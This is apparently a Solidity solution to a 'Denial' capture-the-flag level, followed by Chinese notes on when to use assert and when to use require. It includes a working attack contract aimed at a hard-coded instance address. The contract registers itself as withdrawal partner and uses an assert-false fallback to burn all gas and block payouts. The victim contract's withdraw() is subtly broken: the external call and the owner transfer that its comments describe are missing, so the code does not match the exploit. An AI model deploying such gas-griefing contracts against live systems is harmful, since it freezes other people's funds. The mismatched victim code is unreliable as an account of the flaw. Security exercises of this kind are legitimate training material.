// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract hack {
    address instance_address = 0x32eF8629d2FA8D6953e938b444FE463A0367C22e;

    Denial a = Denial(instance_address);
    
    function hack1() public {
        a.setWithdrawPartner(address(this));
        a.withdraw();
    }

    function() payable {
        assert(0==1);
    }
    
}

//assert(false),编译为0xfe,这是一个无效的操作码，故将消耗掉所有剩余的gas，并恢复所有的操作
//require(false)编译为0xfd,这是revert()的操作码，它将退还所有剩余的gas，同时可以返回一个值（自定义的报错信息
//require()函数应用于满足输入或合约状态变量等有效条件，或验证调用外部合约的返回值等，总之require()语句的失败报错应该被看作一个正常的判断语句流程不通过的事件，而assert()语句的失败报错，意味着发生了代码层面的错误事件，很大可能是合约中有一个bug需要修复。

//故此，使用require()的情况有：

//验证用户输入，例如require(input_var>100);
//验证外部合约的调用结果，例如require(external.send(amount));
//在执行状态更改操作之前验证状态条件，例如require(block.number > 49999)或require(balance[msg.sender]>=amount)一般来说，使用require()的频率更多，通常应用于函数的开头

//使用assert()的情况有：

//检查溢出（上溢出或者下溢出）/检查不变量/更改后验证状态/预防永远不会发生的情况
//一般来说，使用assert()的频率较少，通常用于函数的结尾
//基本上，require()应该是您检查条件的功能，assert()只是为了防止发生任何非常糟糕的事情，但条件不应该等于为false.另外，不能盲目的使用require()去检查溢出问题，只有在你认为之前的检查过程中（require()或if语句）不会产生溢出的情况下使用。